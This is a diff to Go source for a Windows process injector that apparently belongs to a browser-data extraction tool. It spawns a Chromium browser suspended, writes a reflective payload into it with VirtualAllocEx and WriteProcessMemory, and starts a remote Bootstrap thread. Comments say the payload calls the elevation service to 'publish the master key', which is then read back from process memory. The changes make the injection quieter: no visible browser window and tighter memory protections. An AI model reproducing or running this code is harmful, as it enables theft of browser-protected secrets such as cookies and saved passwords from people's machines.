@@ -8,6 +8,7 @@ import (
 	"os"
 	"syscall"
 	"time"
+	"unsafe"
 
 	"golang.org/x/sys/windows"
 
@@ -39,19 +40,13 @@ func (r *Reflective) Inject(exePath string, payload []byte, env map[string]strin
 		return nil, err
 	}
 
-	patched, err := patchPreresolvedImports(payload)
-	if err != nil {
-		return nil, err
-	}
-
 	restore := setEnvTemporarily(env)
 	defer restore()
 
-	pi, udd, err := spawnSuspended(exePath)
+	pi, err := spawnSuspended(exePath)
 	if err != nil {
 		return nil, err
 	}
-	defer os.RemoveAll(udd)
 	defer windows.CloseHandle(pi.Process)
 	defer windows.CloseHandle(pi.Thread)
 
@@ -63,25 +58,25 @@ func (r *Reflective) Inject(exePath string, payload []byte, env map[string]strin
 		}
 	}()
 
-	remoteBase, err := writeRemotePayload(pi.Process, patched)
+	remoteBase, err := writeRemotePayload(pi.Process, payload)
+	if err != nil {
+		return nil, err
+	}
+	scratchBase, err := allocateScratch(pi.Process)
+	if err != nil {
+		return nil, err
+	}
+	paramsBase, err := writeBootstrapParams(pi.Process, scratchBase)
 	if err != nil {
 		return nil, err
 	}
 
-	// Resume briefly so ntdll loader init completes before we hijack a thread; Bootstrap itself is
-	// self-contained but the later elevation_service COM call inside the payload relies on a
-	// fully-initialized PEB. Chrome's main() is left running so it can stand up its own COM/
-	// scheduler infrastructure — the child will show a normal browser window under the isolated
-	// --user-data-dir, which we accept; our Bootstrap finishes before the user sees anything.
-	_, _ = windows.ResumeThread(pi.Thread)
-	time.Sleep(500 * time.Millisecond)
-
-	if err := runAndWait(pi.Process, remoteBase, loaderRVA, r.wait()); err != nil {
+	if err := runAndWait(pi.Process, remoteBase, loaderRVA, paramsBase, r.wait()); err != nil {
 		return nil, err
 	}
 
 	// Read output before TerminateProcess — after kill the memory is gone.
-	result, readErr := readScratch(pi.Process, remoteBase)
+	result, readErr := readScratch(pi.Process, scratchBase)
 
 	_ = windows.TerminateProcess(pi.Process, 0)
 	_, _ = windows.WaitForSingleObject(pi.Process, uint32(terminateWait/time.Millisecond))
@@ -133,63 +128,35 @@ func validateAndLocateLoader(payload []byte) (uint32, error) {
 	return off, nil
 }
 
-// buildIsolatedCommandLine builds the command-line for a spawned, singleton-isolated Chromium process.
-// Only --user-data-dir=<temp> is passed — this is the one switch that matters: it escapes the running
-// browser's ProcessSingleton mutex so the suspended child survives past main() long enough for the
-// remote Bootstrap thread to complete (issue #576). Adding any other flags (--no-startup-window,
-// --disable-extensions, --disable-gpu, ...) has either destabilized Brave (payload dies in DllMain
-// with marker=0x0b) or made newer Chromium forks on Windows 11 exit within ~200ms because they had
-// "nothing to do" after bypassing window creation — letting the browser show a normal window under
-// the isolated UDD is the most compatible behavior across forks and Windows versions.
-func buildIsolatedCommandLine(exePath, udd string) string {
-	// %q would Go-escape backslashes (C:\foo → C:\\foo); Windows CommandLineToArgvW then keeps them
-	// as literal double backslashes in argv. Raw literal quotes match Windows command-line rules.
-	//nolint:gocritic // sprintfQuotedString: %q is wrong for Windows command-line escaping, see above.
-	return fmt.Sprintf(`"%s" --user-data-dir="%s"`, exePath, udd)
-}
-
-// spawnSuspended launches exePath in a fully isolated suspended state. A unique --user-data-dir is
-// passed so the spawned chrome.exe does not collide with any already-running Chrome instance's
-// ProcessSingleton (which would call ExitProcess as soon as main() runs, killing our remote Bootstrap
-// thread before it can publish the master key). The temp UDD is returned so the caller can remove it
-// after injection.
-func spawnSuspended(exePath string) (*windows.ProcessInformation, string, error) {
-	udd, err := os.MkdirTemp("", "hbd-inj-udd-*")
-	if err != nil {
-		return nil, "", fmt.Errorf("injector: make temp user-data-dir: %w", err)
-	}
-
-	cmdLine := buildIsolatedCommandLine(exePath, udd)
-	cmdPtr, err := syscall.UTF16PtrFromString(cmdLine)
-	if err != nil {
-		_ = os.RemoveAll(udd)
-		return nil, "", fmt.Errorf("injector: command line: %w", err)
-	}
+// spawnSuspended launches exePath with its primary thread suspended. The browser's normal startup
+// path is never resumed; only the remote Bootstrap thread runs, matching the ABE reference injector
+// and avoiding any top-level Chromium UI.
+func spawnSuspended(exePath string) (*windows.ProcessInformation, error) {
 	exePtr, err := syscall.UTF16PtrFromString(exePath)
 	if err != nil {
-		_ = os.RemoveAll(udd)
-		return nil, "", fmt.Errorf("injector: exe path: %w", err)
+		return nil, fmt.Errorf("injector: exe path: %w", err)
 	}
-	si := &windows.StartupInfo{}
+	si := &windows.StartupInfo{
+		Cb: uint32(unsafe.Sizeof(windows.StartupInfo{})),
+	}
 	pi := &windows.ProcessInformation{}
 	err = windows.CreateProcess(
-		exePtr, cmdPtr, nil, nil,
+		exePtr, nil, nil, nil,
 		false,
 		windows.CREATE_SUSPENDED,
 		nil, nil, si, pi,
 	)
 	if err != nil {
-		_ = os.RemoveAll(udd)
-		return nil, "", fmt.Errorf("injector: CreateProcess: %w", err)
+		return nil, fmt.Errorf("injector: CreateProcess: %w", err)
 	}
-	return pi, udd, nil
+	return pi, nil
 }
 
 func writeRemotePayload(proc windows.Handle, payload []byte) (uintptr, error) {
 	remoteBase, err := winapi.VirtualAllocEx(proc,
 		uintptr(len(payload)),
 		uint32(windows.MEM_COMMIT|windows.MEM_RESERVE),
-		uint32(windows.PAGE_EXECUTE_READWRITE),
+		uint32(windows.PAGE_READWRITE),
 	)
 	if err != nil {
 		return 0, fmt.Errorf("injector: %w", err)
@@ -202,6 +169,78 @@ func writeRemotePayload(proc windows.Handle, payload []byte) (uintptr, error) {
 	if int(written) != len(payload) {
 		return 0, fmt.Errorf("injector: short write to target (%d/%d)", written, len(payload))
 	}
+	if _, err := winapi.VirtualProtectEx(proc, remoteBase, uintptr(len(payload)), uint32(windows.PAGE_EXECUTE_READ)); err != nil {
+		return 0, fmt.Errorf("injector: protect payload: %w", err)
+	}
+	// Required before the region is executed. Bootstrap flushes again once it has mapped the
+	// payload's own sections, but that runs too late to cover its own first instruction.
+	if err := winapi.FlushInstructionCache(proc, remoteBase, uintptr(len(payload))); err != nil {
+		return 0, fmt.Errorf("injector: flush instruction cache: %w", err)
+	}
+	return remoteBase, nil
+}
+
+func allocateScratch(proc windows.Handle) (uintptr, error) {
+	// Keep the old scratch offsets stable for diagnostics/key reads, but place the scratch area in
+	// its own RW allocation so the raw payload image can be execute-only after writing.
+	const scratchSize = bootstrap.KeyOffset + bootstrap.KeyLen
+	remoteBase, err := winapi.VirtualAllocEx(proc,
+		uintptr(scratchSize),
+		uint32(windows.MEM_COMMIT|windows.MEM_RESERVE),
+		uint32(windows.PAGE_READWRITE),
+	)
+	if err != nil {
+		return 0, fmt.Errorf("injector: allocate scratch: %w", err)
+	}
+	return remoteBase, nil
+}
+
+// encodeBootstrapParams lays out the C BootstrapParams struct using the cgo-generated field
+// offsets, so a field added or reordered in bootstrap_layout.h shows up as a layout.go diff
+// rather than as a silently misread pointer inside the target process.
+func encodeBootstrapParams(scratchBase uintptr) ([]byte, error) {
+	fields := []struct {
+		offset int
+		addr   uintptr
+	}{
+		{bootstrap.ParamScratchBase, scratchBase},
+		{bootstrap.ParamLoadLibraryA, winapi.AddrLoadLibraryA()},
+		{bootstrap.ParamGetProcAddress, winapi.AddrGetProcAddress()},
+		{bootstrap.ParamVirtualAlloc, winapi.AddrVirtualAlloc()},
+		{bootstrap.ParamVirtualProtect, winapi.AddrVirtualProtect()},
+		{bootstrap.ParamNtFlushIC, winapi.AddrNtFlushInstructionCache()},
+	}
+	params := make([]byte, bootstrap.ParamsSize)
+	for _, f := range fields {
+		if f.addr == 0 {
+			return nil, fmt.Errorf("injector: failed to resolve one or more bootstrap params")
+		}
+		binary.LittleEndian.PutUint64(params[f.offset:f.offset+8], uint64(f.addr))
+	}
+	return params, nil
+}
+
+func writeBootstrapParams(proc windows.Handle, scratchBase uintptr) (uintptr, error) {
+	params, err := encodeBootstrapParams(scratchBase)
+	if err != nil {
+		return 0, err
+	}
+
+	remoteBase, err := winapi.VirtualAllocEx(proc,
+		uintptr(len(params)),
+		uint32(windows.MEM_COMMIT|windows.MEM_RESERVE),
+		uint32(windows.PAGE_READWRITE),
+	)
+	if err != nil {
+		return 0, fmt.Errorf("injector: allocate bootstrap params: %w", err)
+	}
+	var written uintptr
+	if err := windows.WriteProcessMemory(proc, remoteBase, &params[0], uintptr(len(params)), &written); err != nil {
+		return 0, fmt.Errorf("injector: write bootstrap params: %w", err)
+	}
+	if int(written) != len(params) {
+		return 0, fmt.Errorf("injector: short write to bootstrap params (%d/%d)", written, len(params))
+	}
 	return remoteBase, nil
 }
 
@@ -209,9 +248,9 @@ func writeRemotePayload(proc windows.Handle, payload []byte) (uintptr, error) {
 // process is still running; any other value means the process has already terminated.
 const stillActive uint32 = 259
 
-func runAndWait(proc windows.Handle, remoteBase uintptr, loaderRVA uint32, wait time.Duration) error {
+func runAndWait(proc windows.Handle, remoteBase uintptr, loaderRVA uint32, param uintptr, wait time.Duration) error {
 	entry := remoteBase + uintptr(loaderRVA)
-	hThread, err := winapi.CreateRemoteThread(proc, entry, 0)
+	hThread, err := winapi.CreateRemoteThread(proc, entry, param)
 	if err != nil {
 		// Diagnostic: distinguish a dead target (Chrome self-exited before we could inject — policy,
 		// version, UDD-restriction, sandbox-init failure) from a live target whose NtCreateThreadEx
@@ -279,40 +318,6 @@ func readScratch(proc windows.Handle, remoteBase uintptr) (scratchResult, error)
 	}
 	result.Key = buf
 	return result, nil
-}
-
-// patchPreresolvedImports writes five pre-resolved Win32 function pointers into the payload's DOS stub
-// so Bootstrap skips PEB.Ldr traversal entirely. Validity relies on KnownDlls + session-consistent
-// ASLR (kernel32 and ntdll share the same virtual address across processes in one boot session).
-func patchPreresolvedImports(payload []byte) ([]byte, error) {
-	if len(payload) < bootstrap.ImpNtFlushICOffset+8 {
-		return nil, fmt.Errorf("injector: payload too small for pre-resolved import patch")
-	}
-
-	pLoadLibraryA := winapi.AddrLoadLibraryA()
-	pGetProcAddress := winapi.AddrGetProcAddress()
-	pVirtualAlloc := winapi.AddrVirtualAlloc()
-	pVirtualProtect := winapi.AddrVirtualProtect()
-	pNtFlushIC := winapi.AddrNtFlushInstructionCache()
-
-	if pLoadLibraryA == 0 || pGetProcAddress == 0 || pVirtualAlloc == 0 ||
-		pVirtualProtect == 0 || pNtFlushIC == 0 {
-		return nil, fmt.Errorf("injector: failed to resolve one or more pre-resolved imports")
-	}
-
-	patched := make([]byte, len(payload))
-	copy(patched, payload)
-
-	writeAddr := func(off int, addr uintptr) {
-		binary.LittleEndian.PutUint64(patched[off:off+8], uint64(addr))
-	}
-	writeAddr(bootstrap.ImpLoadLibraryAOffset, pLoadLibraryA)
-	writeAddr(bootstrap.ImpGetProcAddressOffset, pGetProcAddress)
-	writeAddr(bootstrap.ImpVirtualAllocOffset, pVirtualAlloc)
-	writeAddr(bootstrap.ImpVirtualProtectOffset, pVirtualProtect)
-	writeAddr(bootstrap.ImpNtFlushICOffset, pNtFlushIC)
-
-	return patched, nil
 }
 
 // setEnvTemporarily mutates the current process's env; NOT concurrency-safe. Callers must serialize
